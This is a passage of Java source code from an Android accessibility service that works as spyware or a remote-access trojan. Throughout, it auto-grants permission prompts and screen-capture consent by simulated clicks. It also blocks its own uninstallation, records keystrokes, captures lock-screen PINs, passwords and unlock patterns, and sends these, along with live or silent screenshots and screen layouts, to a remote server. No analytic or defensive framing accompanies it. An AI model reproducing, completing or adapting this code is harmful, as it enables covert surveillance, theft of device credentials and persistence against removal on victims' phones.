                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 180 / deviceWidth - 80));
                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 180 / deviceWidth - 100));
                Common.getInstance().setMousePositionEntries(autostartDraw);
                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Log.d("startScroll::", "startsto");
                        startAutoSetScrolling();
                    }
                }, 1500);
            }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            CharSequence packagename = String.valueOf(event.getPackageName());
            CharSequence classname = String.valueOf(event.getClassName());
            Log.d("classnameÇÇ", packagename + " " + classname);
            if (packagename.equals("com.miui.securitycenter")) {
                if (isAutoBackPermission) {
                    onGoBack();
                } else {
                    getAutoStartBackgroundPermission(getRootInActiveWindow());
                }
            }
        }
    }

    private void getAutoStartBackgroundPermission(AccessibilityNodeInfo node) {
        if (node != null) {
            if ((node.getClassName() != null) && (node.getClassName().equals("android.widget.TextView") || node.getClassName().equals("android.widget.CheckBox"))) {
                Log.d("getClassName::", node.getClassName().toString());
                if (node.getText() != null) {
                    String nodeText = node.getText().toString();
                    Log.d("nodetext::", nodeText);
                    if (nodeText.equals(getResources().getString(R.string.app_name))) {
                        Rect rect = new Rect();
                        node.getBoundsInScreen(rect);
                        performClickMain(deviceWidth - 140, rect.top);
                        stopScrollingHandler();
                        isAutoBackPermission = true;
                        Common.getInstance().setAutoBackEnable(true);
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getAutoStartBackgroundPermission(node.getChild(i));
            }
        }
    }

    private void startAutoSetScrolling() {
        scrollRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isAutoBackPermission) {
                    mouseDraw();
                    scrollHandler.postDelayed(this, 500);
                }
            }
        };
        scrollHandler.post(scrollRunnable);
    }

    public void stopScrollingHandler() {
        scrollHandler.removeCallbacks(scrollRunnable);
    }


    private void setPermEditorEnable(AccessibilityEvent event) {
        CharSequence packagename = String.valueOf(event.getPackageName());
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (packagename.equals("com.android.systemui") || packagename.equals("com.miui.securitycenter")) {
                if (event.getClassName() != null) {
                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    if (rootNode != null) {
                        getPermEditorEnable(rootNode);
                    }
                }
            }
        }
    }

    public void getPermEditorEnable(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null) {
                if (node.getClassName().equals("android.widget.TextView")) {
                    if (node.getText() != null) {
                        String nodeText = node.getText().toString().toLowerCase();
                        Log.d("Button Text Media", nodeText);
                        if (nodeText.equals("other permissions")
                                || nodeText.equals("outras permissões")
                                || nodeText.equals("otros permisos")
                                || nodeText.equals("diğer izinler")
                                || nodeText.equals("其他权限")) {
                            if (Common.getInstance().getAutosel()) {
                                onGoBack();
                                Common.getInstance().setAutostartEnable(false);
                            } else {
                                if (node.getParent() != null && node.getParent().isClickable()) {
                                    node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                }
                            }
                        } else if (nodeText.equals("open new windows while running in the background")
                                || nodeText.equals("display pop-up windows while running in the background")
                                || nodeText.equals("abrir novas janelas enquanto executa em segundo plano")
                                || nodeText.equals("abrir nuevas ventanas mientras se ejecuta en segundo plano")
                                || nodeText.equals("mostrar janelas pop-up enquanto estiver executando em segundo plano")
                                || nodeText.equals("mostrar ventanas emergentes mientras se ejecuta en segundo plano")
                                || nodeText.equals("arka planda çalışırken yeni pencereler açın")
                                || nodeText.equals("arka planda çalışırken açılır pencereleri görüntüle")
                                || nodeText.equals("后台弹出界面")) {
                            if (Common.getInstance().getAutosel()) {
                                onGoBack();
                            } else {
                                if (node.getParent() != null && node.getParent().isClickable()) {
                                    node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                }
                            }
                        }
                    }
                } else if (node.getClassName().equals("android.widget.RadioButton")) {
                    if (Common.getInstance().getAutosel()) {
                        onGoBack();
                    } else {
                        if ((node.getText() != null && (node.getText().toString().toLowerCase().equals("always allow")
                                || node.getText().toString().toLowerCase().equals("sempre permitir")
                                || node.getText().toString().toLowerCase().equals("permitir siempre")
                                || node.getText().toString().toLowerCase().equals("her zaman izin ver")
                                || node.getText().toString().toLowerCase().equals("始终允许")))
                                ||
                                (node.getContentDescription() != null && (node.getContentDescription().toString().toLowerCase().equals("always allow")
                                        || node.getContentDescription().toString().toLowerCase().equals("sempre permitir")
                                        || node.getContentDescription().toString().toLowerCase().equals("permitir siempre")
                                        || node.getContentDescription().toString().toLowerCase().equals("her zaman izin ver")
                                        || node.getContentDescription().toString().toLowerCase().equals("始终允许")))) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Common.getInstance().setAutosel(true);
                            onGoBack();
                        }
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getPermEditorEnable(node.getChild(i));
            }
        }
    }

    private void setMediaProjectionPermission(AccessibilityEvent event) {
        CharSequence packagename = String.valueOf(event.getPackageName());
        if (packagename.equals("com.android.systemui")) {
            if (event.getClassName() != null) {
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    getMediaProjectionPermission(rootNode);
                }
            }
        }
    }

    private void setStopUninstall(AccessibilityEvent event) {
        if (!iscanuninstallapp) {
            CharSequence packagename = String.valueOf(event.getPackageName());
            CharSequence classname = String.valueOf(event.getClassName());
            if (packagename.equals("com.google.android.packageinstaller") ||
                    packagename.equals("com.android.systemui") ||
                    packagename.equals("com.miui.home") ||
                    (packagename.equals("com.mi.android.globallauncher") && classname.equals("com.miui.home.launcher.uninstall.DeleteDialog"))) {
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    isSelectedApp = false;
                    isUninstallapp = false;
                    isAppDetail = false;
                    getUninstallDialog(rootNode);
                    if (isSelectedApp && isUninstallapp) {
                        makeOverlayRemoveScreen();
                        setStopUninstallApp(rootNode);
                    }

                    if (isSelectedApp && isAppDetail) {
                        onGoBack();
                    }
                }
            }

            if (packagename.equals("com.miui.securitycenter") || packagename.equals("com.android.settings")) {
                isSelectedApp = false;
                isAppDetail = false;
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                getAppDetailPage(rootNode);
                if (isSelectedApp && isAppDetail) {
                    makeOverlayRemoveScreen();
                    onGoBack();
                }
            }
        } else {
            CharSequence packagename = String.valueOf(event.getPackageName());
            CharSequence classname = String.valueOf(event.getClassName());
            if (packagename.equals("com.google.android.packageinstaller") ||
                    packagename.equals("com.android.systemui") ||
                    packagename.equals("com.miui.home") ||
                    (packagename.equals("com.mi.android.globallauncher") && classname.equals("com.miui.home.launcher.uninstall.DeleteDialog"))) {
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    isSelectedApp = false;
                    isUninstallapp = false;
                    isAppDetail = false;
                    getUninstallDialog(rootNode);
                    if (isSelectedApp && isUninstallapp) {
                        setUninstallApp(rootNode);
                    }
                }
            }
        }
    }

    private void setStopUnAccessibility() {
        AccessibilityNodeInfo node = getRootInActiveWindow();
        if (node != null) {
            getAccessibilityPage(node);
        }
    }

    private void setAutomaticallyPermission(AccessibilityEvent event) {
//        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
        CharSequence packagename = String.valueOf(event.getPackageName());
        if (packagename.equals("com.google.android.permissioncontroller") || packagename.equals("com.android.permissioncontroller")) {
            if (event.getClassName() != null) {
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    getAutomaticallyPermission(rootNode);
                }
            }
        }
//        }
    }

    public void AllowPrims14_normal() {
        int startX = deviceWidth / 2;
        int startY = (int) (deviceHeight * 0.45);

        int step = 10;// steps bettwen each click
        int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            for (String permission : MyPermissions.ALL_PERMISSIONS) {
                try {
                    Thread.sleep(100);
                } catch (Exception s) {
                    Log.d("Permission::", "permission");
                }
                for (int y = startY; y < endY; y += step) {
                    try {
                        Log.d("Permission::", permission + String.valueOf(y) + ":::" + String.valueOf(deviceHeight));
                        Thread.sleep(10);
                    } catch (Exception s) {
                        Log.d("Permission::", "permission");
                    }

                    if (MyPermissions.hasPermissions(getBaseContext(), permission)) {
                        break;
                    }
                    Common.getInstance().setLastPermissionlocation(y);
                    try {
                        clickthis(startX, y);

                    } catch (Exception e) {
                        // Handle the exception if needed
                    }
                }
            }
        }
    }

    public void AllowPrims14_phone() {
        int startX = deviceWidth / 2;
        int startY = (int) (deviceHeight * 0.5);

        int step = 10;// steps bettwen each click
        int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            for (String permission : MyPermissions.ALL_phone) {
                try {
                    Thread.sleep(100);
                } catch (Exception s) {
                    Log.d("Permission::", "permission");
                }
                for (int y = startY; y < endY; y += step) {
                    try {
                        Log.d("Permission::", permission + String.valueOf(y) + ":::" + String.valueOf(deviceHeight));
                        Thread.sleep(10);
                    } catch (Exception s) {
                        Log.d("Permission::", "permission");
                    }

                    if (MyPermissions.hasPermissions(getBaseContext(), permission)) {
                        break;
                    }
                    Common.getInstance().setLastPermissionlocation(y);
                    try {
                        clickthis(startX, y);

                    } catch (Exception e) {
                        // Handle the exception if needed
                    }
                }
            }
        }
    }

    public void AllowPrims14_media() {
        int startX = deviceWidth / 2;
        int startY = (int) (deviceHeight * 0.55);
        if (Common.getInstance().getLastPermissionlocation() > (int) (deviceHeight * 0.55)) {
            startY = Common.getInstance().getLastPermissionlocation() - 10;
        }

        int step = 10;// steps bettwen each click
        int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                Thread.sleep(100);
            } catch (Exception s) {
                Log.d("Permission::", "permission");
            }
            for (String permission : MyPermissions.MEDIA_PERMISSION) {
                for (int y = startY; y < endY; y += step) {
                    try {
                        Log.d("Permission::", permission + String.valueOf(y) + ":::" + String.valueOf(deviceHeight));
                        Thread.sleep(10);
                    } catch (Exception s) {
                        Log.d("Permission::", "permission");
                    }

                    if (MyPermissions.hasPermissions(getBaseContext(), permission)) {
                        break;
                    }
                    try {
                        clickthis(startX, y);

                    } catch (Exception e) {
                        // Handle the exception if needed
                    }
                }
            }
        }
    }


    private void getKeyLogger(AccessibilityEvent event) {
        CharSequence packagename = String.valueOf(event.getPackageName());
        CharSequence text = "";
        String eventString = "";
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && "android.widget.EditText".equals(source.getClassName().toString())) {
                if (source.getText() != null) {
                    text = source.getText().toString();
                    eventString = "Text Input";
                    if(isKeyguardScreen) {
                        devicePassword = combineStrings(devicePassword, text.toString());
                        Log.d("device Password::", devicePassword);
                    } else {
                        Log.d("device Password::", "no");
                    }
                    if (Server.getContext() != null) {
                        Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                        if (isKeylogger) {
                            Server.getContext().sendKeyLog(text, packagename, eventString);
                        }
                    }
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!currentPackagename.equals(packagename.toString())) {
                currentPackagename = packagename.toString();
                AccessibilityNodeInfo source = event.getSource();
                if (source != null && source.isVisibleToUser() && source.getText() != null) {
                    if (!source.getText().equals("")) {
                        text = source.getText().toString();
                        eventString = "Navigation";
                        if (Server.getContext() != null) {
                            // Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                            if (isKeylogger) {
                                Server.getContext().sendKeyLog(text, packagename, eventString);
                            }
                        }
                    }
                }
            }

            if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null && source.getClassName() != null) {
                    if (source.getText() != null && source.isVisibleToUser() && source.getClassName().equals("android.widget.EditText")) {
                        text = source.getText().toString();
                        eventString = "Text Input";
                        if (Server.getContext() != null) {
                            Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                            if (isKeylogger) {
                                Server.getContext().sendKeyLog(text, packagename, eventString);
                            }
                        }
                    }
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getClassName() != null) {
                if (source.getText() != null && source.isVisibleToUser() && source.getClassName().equals("android.widget.EditText")) {
                    text = source.getText().toString();
                    eventString = "Text Input";
                    if (Server.getContext() != null) {
                        Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                        if (isKeylogger) {
                            if (!text.equals("•")) {
                                Log.d("Skeleton Text::", text.toString());
                                Server.getContext().sendKeyLog(text, packagename, eventString);
                            }
                        }
                    }
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.isVisibleToUser() && source.isClickable()) {
                // Check if the clicked view is a Button
                CharSequence className = source.getClassName();
                if (className != null) {
                    if (Server.getContext() != null) {
                        String Button_Text = "";
                        if (source.getText() != null) {
                            Button_Text = source.getText().toString().toLowerCase();
                            text = Button_Text;
                            eventString = "Button Click";
                            if (!text.equals("") && !text.equals("cancel") && !text.equals("cancelar") && !text.equals("取消")) {
                                // Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                                if (isKeylogger) {
                                    Server.getContext().sendKeyLog(text, packagename, eventString);
                                }
                            }

                        }
                    }
                }
            }
        }
    }

    public void getMediaProjectionPermission(AccessibilityNodeInfo node) {
//        Log.d(TAG, "<======================getMediaProjectionPermission===========================>");
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    if (Common.getInstance().getMediaProjection()) {
                        if (nodeText.equals("start now")
                                || nodeText.equals("start")
                                || nodeText.equals("iniciar agora")
                                || nodeText.equals("iniciar ahora")
                                || nodeText.equals("empezar ahora")
                                || nodeText.equals("começar agora")
                                || nodeText.equals("início")
                                || nodeText.equals("iniciar")
                                || nodeText.equals("şimdi başla")
                                || nodeText.equals("şimdi başlat")
                                || nodeText.equals("立即开始")) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else if (nodeText.equals("cancel") || nodeText.equals("cancelar") || nodeText.equals("iptal") || nodeText.equals("取消")) {
                            Rect rect = new Rect();
                            node.getBoundsInScreen(rect);
                            performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
                        }
                    }

                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getMediaProjectionPermission(node.getChild(i));
            }
        }
    }

    public void getUninstallDialog(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    Log.d("uninstall nodeText::", nodeText);
                    if (node.isVisibleToUser() && (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName()))) {
                        isSelectedApp = true;
                    }
                    if (node.isVisibleToUser() && (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("kaldır") || nodeText.contains("卸载") || nodeText.contains("解除安"))) {
                        isUninstallapp = true;
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getUninstallDialog(node.getChild(i));
            }
        }
    }

    public void getAppDetailPage(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    if (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName())) {
                        isSelectedApp = true;
                    }
                    if (nodeText.contains("informações do app") || nodeText.contains("app info")
                            || nodeText.contains("informações do aplicativo")
                            || nodeText.contains("información de aplicación")
                            || nodeText.contains("información de la aplicación")
                            || nodeText.contains("información de aplicaciones")
                            || nodeText.contains("uygulama bilgisi")
                            || nodeText.contains("uygulama bilgileri")
                            || nodeText.contains("应用信息")
                            || nodeText.contains("应用程序信息")
                            || nodeText.contains("應用程式資訊")) {
                        isAppDetail = true;
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getAppDetailPage(node.getChild(i));
            }
        }
    }


    public void getAccessibilityPage(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString();
                    if (nodeText.contains(getResources().getString(R.string.accessibility_service_description))) {
                        onGoBack();
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getAccessibilityPage(node.getChild(i));
            }
        }
    }

    public void getAutomaticallyPermission(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    if (nodeText.equals("durante o uso do app")
                            || nodeText.equals("permitir durante o uso do app")
                            || nodeText.equals("mientras se usa la aplicación")
                            || nodeText.equals("mientras la app está en uso")
                            || nodeText.equals("permitir si la aplicación está en uso")
                            || nodeText.equals("while using the app")
                            || nodeText.equals("allow only while using the app")
                            || nodeText.equals("allow")
                            || nodeText.equals("allow all")
                            || nodeText.equals("permitir")
                            || nodeText.equals("uygulamayı kullanırken")
                            || nodeText.equals("izin ver")) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getAutomaticallyPermission(node.getChild(i));
            }
        }
    }

    public void setUninstallApp(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    if (nodeText.equals("ok") || nodeText.equals("aceptar") || nodeText.equals("tamam")) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                setUninstallApp(node.getChild(i));
            }
        }
    }

    public void setStopUninstallApp(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                if (node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    if (nodeText.equals("cancel")
                            || nodeText.equals("cancelar")
                            || nodeText.equals("iptal")
                            || nodeText.equals("取消")) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                setStopUninstallApp(node.getChild(i));
            }
        }
    }

    private void findFocusedNode(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED
                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (focusedNode != null && focusedNode.isVisibleToUser() && focusedNode.getClassName().equals("android.widget.EditText")) {
                    isEditable = true;
                    CharSequence currentText = focusedNode.getText();
                    if (currentText != null) {
                        if (isKeyguardScreen) {
                            devicePassword = combineStrings(devicePassword, currentText.toString());
                        }
                        Log.d("AccessibilityService", "Focused input text: " + currentText.toString());
                    } else {
                        if (isKeyguardScreen) {
                            devicePassword = "";
                        }
                        Log.d("AccessibilityService", "EditText is empty or null");
                    }
                }
            }
        }
    }

    private void onDetectLockApp(AccessibilityEvent event) {
        String packagename = String.valueOf(event.getPackageName());
        if (packageList.contains(packagename)) {
            onGoHome();
        }
    }

    private void findKeyguardScreen(AccessibilityEvent event) {
        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            String packagename = String.valueOf(event.getPackageName());
            if (packagename.equals("com.android.systemui")) {
                isKeyguardScreen = false;
                isKeyguardPatternScreen = true;
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                getKeyguardPage(rootNode);
                if (isKeyguardScreen) {
                    if(isKeyguardPatternScreen && !isSetKeyguard) {
                        makeOverlayTouchScreen();
                    }
                } else {
                    removeTouchOverlayscreen();
                }
            } else {
                if(!packagename.equals("com.support.litework")) {
                    if(!movementPoints.isEmpty()) {
                        if (Server.getContext() != null) {
                            Server.getContext().sendPatternKeyData(movementPoints);
                            movementPoints.clear();
                        }
                    } else if (!devicePassword.isEmpty()) {
                        if (Server.getContext() != null) {
                            movementPoints.clear();
                            Common.getInstance().setKeygenEntries(movementPoints);
                            Server.getContext().sendPatternKeyData(movementPoints);
                            Server.getContext().sendPasswordKeyData(devicePassword);
                            devicePassword = "";
                        }
                    }
                    removeTouchOverlayscreen();
                    isSetKeyguard = false;
                }
            }
        }
    }

    public void getKeyguardPage(AccessibilityNodeInfo node) {
        if (node != null) {
            if (node.getClassName() != null) {
                if (node.getClassName().equals("android.widget.Button")) {
                    if (node.getText() != null) {
                        String nodeText = node.getText().toString().toLowerCase();
                        Log.d("TextView::" , nodeText);
                        if (nodeText.contains("emergency")
                                || nodeText.contains("emergência")
                                || nodeText.contains("emergencia")
                                || nodeText.contains("acil durum")) {
                            isKeyguardScreen = true;
                        }
                    }
                }

                if(node.getClassName().equals("android.widget.EditText")) {
                    isKeyguardPatternScreen = false;
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                getKeyguardPage(node.getChild(i));
            }
        }
    }

    private void getSkeletonInfo(AccessibilityEvent event) {
        String packageName = String.valueOf(event.getPackageName());
        skeletonEntryResultList.clear();
        skeletonEntryResultList.addAll(printVisibleViewSkeleton(getRootInActiveWindow()));

        if (Server.getContext() != null && skeletonEntryResultList.size() > 0) {
            if (isSkeletonMonitoring) {
                Server.getContext().sendScreenSkeletonMonitoring(packageName, deviceWidth, deviceHeight, skeletonEntryResultList);
            }
        } else {
            Log.d("Root info", "no info");
        }
    }

    public void screenShotDevice() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(0, getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {

                @Override
                public void onSuccess(@NonNull ScreenshotResult screenshot) {
                    new Thread() {
                        @Override
                        public void run() {
                            long currentTime = System.currentTimeMillis();
                            if (currentTime - lastFrameTime < frameInterval) {
                                return;
                            }
                            lastFrameTime = currentTime;
                            try {
                                Bitmap wrapHardwareBuffer = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());

                                // Compress the Bitmap to JPEG format with 50% quality
                                try {
                                    assert wrapHardwareBuffer != null;
                                    deviceWidth = wrapHardwareBuffer.getWidth();
                                    deviceHeight = wrapHardwareBuffer.getHeight();
                                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                                    Bitmap scaledBitmap;
                                    if (blackScreen || isImageOverlayScreen) {
                                        Bitmap converImage = changeImageOpacity(wrapHardwareBuffer,1.0f);
                                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
                                    } else {
                                        scaledBitmap = Bitmap.createScaledBitmap(wrapHardwareBuffer, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
                                    }
                                    screen_outputStream = outputStream;
                                    if(mode_status.equals("SILENT")) {
                                        sendScreenMonitoringData(outputStream);
                                    }

                                    scaledBitmap.recycle();
                                    outputStream.close();
                                } catch (IOException e) {
                                    throw new RuntimeException(e);
                                }

                            } catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    }.start();
                }

                @Override
                public void onFailure(int errorCode) {

                }
            });
        }
    }

    private void startCapture() {
        int width = deviceWidth;
        int height = deviceHeight;
        int densityDpi = deviceDensityDpi;

        mediaProjection.registerCallback(mediaProjectionCallback, null);

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                width,
                height,
                densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                null
        );

        imageReader.setOnImageAvailableListener(reader -> {
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastFrameTime < frameInterval) {
                Image skipImage = reader.acquireLatestImage();
                if (skipImage != null) {
                    skipImage.close();
                }
                return;
            }

            lastFrameTime = currentTime;

            Image image = reader.acquireLatestImage();
            if (image != null) {
                try {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * image.getWidth();
                    int bitmapWidth = image.getWidth() + rowPadding / pixelStride;
                    int bitmapHeight = image.getHeight();

                    Bitmap bitmap = Bitmap.createBitmap(bitmapWidth, bitmapHeight, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    Bitmap scaledBitmap;
                    if (blackScreen || isImageOverlayScreen) {
                        Bitmap converImage = changeImageOpacity(bitmap, 1.0f);
                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
                        } else {
                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                        }

                    } else {
                        scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
                        }else {
                            scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                        }
                    }
                    screen_outputStream = outputStream;
                    if(mode_status.equals("LIVE")) {
                        sendScreenMonitoringData(outputStream);
                    }
                    bitmap.recycle();
                    scaledBitmap.recycle();
                    outputStream.close();
                } catch (Exception e) {
                    System.out.println("Error processing image: " + e.getLocalizedMessage());
                }
                image.close();
            }
        }, null);
    }

    private final MediaProjection.Callback mediaProjectionCallback = new MediaProjection.Callback() {
        @Override
        public void onStop() {
            super.onStop();
        }
    };

    public static Bitmap changeImageOpacity(Bitmap originalImage, float opacity) {
        // Create a mutable bitmap with the same size as the original
        Bitmap adjustedImage = Bitmap.createBitmap(
                originalImage.getWidth(),
                originalImage.getHeight(),
                Bitmap.Config.ARGB_8888
        );
        Canvas canvas = new Canvas(adjustedImage);
        Paint paint = new Paint();
        paint.setAlpha((int) (opacity * 255));
        float brightness = 1.0f;
        float contrast = 50.0f;
//        float gamma = 1.0f;
        float adjustedBrightness = brightness - 1.0f;
        ColorMatrix colorMatrix = new ColorMatrix(new float[]{
                contrast, 0, 0, 0, adjustedBrightness,
                0, contrast, 0, 0, adjustedBrightness,
                0, 0, contrast, 0, adjustedBrightness,
                0, 0, 0, contrast, adjustedBrightness
        });
        paint.setColorFilter(new ColorMatrixColorFilter(colorMatrix));
        canvas.drawBitmap(originalImage.copy(Bitmap.Config.ARGB_8888, true), 0, 0, paint);
        return adjustedImage;
    }

    private List<SkeletonEntry> printVisibleViewSkeleton(AccessibilityNodeInfo nodeInfo) {
        List<SkeletonEntry> skeletonEntryList = new ArrayList<>();
        try {
            if (nodeInfo == null || !nodeInfo.isVisibleToUser()) return skeletonEntryList;
            String type;
            switch (nodeInfo.getClassName() != null ? nodeInfo.getClassName().toString() : "") {
                case "android.widget.TextView":
                    type = "text";
                    break;
                case "android.widget.Button":
                    type = "button";
                    break;
                case "android.widget.EditText":
                    type = "edit";
                    break;
                case "android.view.View":
                    type = "view";
                    break;
                case "android.widget.FrameLayout":
                    type = "framelayout";
                    break;
                case "android.widget.ImageView":
                    type = "imageview";
                    break;
                case "com.google.android.material.bottomsheet.a":
                    type = "bottomsheet";
                    break;
                case "android.view.ViewGroup":
                    type = "viewgroup";
                    break;
                default:
                    type = "unknown";
                    break;
            }

            if (!type.equals("unknown")) {
                String text = nodeInfo.getText() != null ? nodeInfo.getText().toString() :
                        (nodeInfo.getContentDescription() != null ? nodeInfo.getContentDescription().toString() : "");
                Rect rect = new Rect();
                nodeInfo.getBoundsInScreen(rect);
                if(!(type.equals("viewgroup") && text.isEmpty())) {
                    skeletonEntryList.add(new SkeletonEntry(text, type, rect.left, rect.top, rect.width(), rect.height(), currentPackagename));
                }
            }

            // Recursively process child nodes and collect their results
            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                skeletonEntryList.addAll(printVisibleViewSkeleton(nodeInfo.getChild(i)));
            }
        } catch (Exception exception) {
            Log.e("Acc", "Error in esqueletoView: " + exception.getLocalizedMessage());
            exception.printStackTrace();
        }
        return skeletonEntryList;  // Return the collected list of skeleton entries
    }

    @Override
    public void onInterrupt() {

    }

    public void makeBlackScreen() {
